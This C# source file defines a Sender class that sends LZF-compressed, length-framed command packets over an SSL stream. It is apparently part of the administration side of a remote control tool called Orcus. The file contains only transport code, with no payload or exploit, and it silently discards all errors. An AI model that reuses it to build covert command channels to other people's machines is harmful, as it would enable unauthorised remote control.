using System;
using Orcus.Shared.Communication;
using System.IO;
using System.Net.Security;
using Orcus.Shared.Compression;

namespace Orcus.Administration.App
{
	public class Sender
	{
		public readonly object WriterLock = new object();

		public Sender(BinaryReader binaryReader, BinaryWriter binaryWriter, SslStream sslStream)
		{
			BinaryReader = binaryReader;
			BinaryWriter = binaryWriter;
			SslStream = sslStream;
		}

		public void Dispose()
		{
			BinaryWriter.Dispose();
			BinaryReader.Dispose();
			SslStream.Dispose();
		}

		public BinaryReader BinaryReader { get; set; }
		public BinaryWriter BinaryWriter { get; set; }
		public SslStream SslStream { get; set; }

		public void Send(int id, byte[] bytes)
		{
			try
			{
				var compress = bytes.Length > 75; //Because there is lots of overhead, we don't compress below 75 B
				byte[] compressedData = null;
				if (compress)
					compressedData = LZF.Compress(bytes, 0);

				lock (WriterLock)
				{
					BinaryWriter.Write(
						(byte) (compress ? FromAdministrationPackage.SendCommandCompressed : FromAdministrationPackage.SendCommand));
					BinaryWriter.Write((compress ? compressedData.Length : bytes.Length) + 5);
					BinaryWriter.Write(BitConverter.GetBytes(id));
					BinaryWriter.Write((byte) SendingType.Command);
					BinaryWriter.Write(compress ? compressedData : bytes);
					BinaryWriter.Flush();
				}
			}
			catch (Exception)
			{
				// ignored
			}
		}

		public void SendDynamicCommand(byte[] bytes)
		{
			try
			{
				byte[] compressedData = null;
				var compressed = false;
				if (bytes.Length > 75) //Because there is a lot of overhead, we don't compress below 75 B
				{
					compressedData = LZF.Compress(bytes, 0);
					if (bytes.Length > compressedData.Length)
						//If the compression isn't larger than the source, we will send the compressed data
						compressed = true;
				}

				lock (WriterLock)
				{
					BinaryWriter.Write(
						(byte)
						(compressed
							? FromAdministrationPackage.SendDynamicCommandCompressed
							: FromAdministrationPackage.SendDynamicCommand));
					BinaryWriter.Write(compressed ? compressedData.Length : bytes.Length);
					BinaryWriter.Write(compressed ? compressedData : bytes);
					BinaryWriter.Flush();
				}
			}
			catch (Exception)
			{
				// ignored
			}
		}
	}
}